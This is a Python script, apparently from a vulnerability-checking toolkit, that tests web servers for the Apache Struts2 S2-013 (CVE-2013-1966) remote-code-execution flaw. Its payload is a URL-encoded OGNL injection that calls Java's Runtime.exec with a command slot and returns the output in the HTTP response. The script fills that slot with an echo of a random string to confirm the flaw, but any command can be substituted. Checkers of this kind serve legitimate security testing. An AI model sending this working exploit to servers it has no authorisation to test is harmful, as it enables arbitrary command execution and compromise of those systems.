#!/usr/bin/env python3

import urllib
import random
import string
import requests

class S2_013_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-013漏洞,又名CVE-2013-1966漏洞',
            'description': 'Struts2 S2-013漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.1',
            'date': '2013-04-16',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/link.action'
        self.capta = self.get_capta() 
        self.payload = '?a=%24%7B%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27{cmd}%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
                                         
    def filter(self, check_str):

        """
        过滤无用字符

        :param str check_str:待过滤的字符串

        :return str temp:过滤后的字符串
        """
        
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp                
    
    def get_capta(self):
        
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """

        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta
    
    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            check_url = self.url + self.payload.format(cmd = urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8'))
            check_res = requests.get(check_url)
            check_str = self.filter(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_013 = S2_013_BaseVerify('http://localhost:8080/s2_013_war_exploded/HelloWorld.action')
    S2_013.run()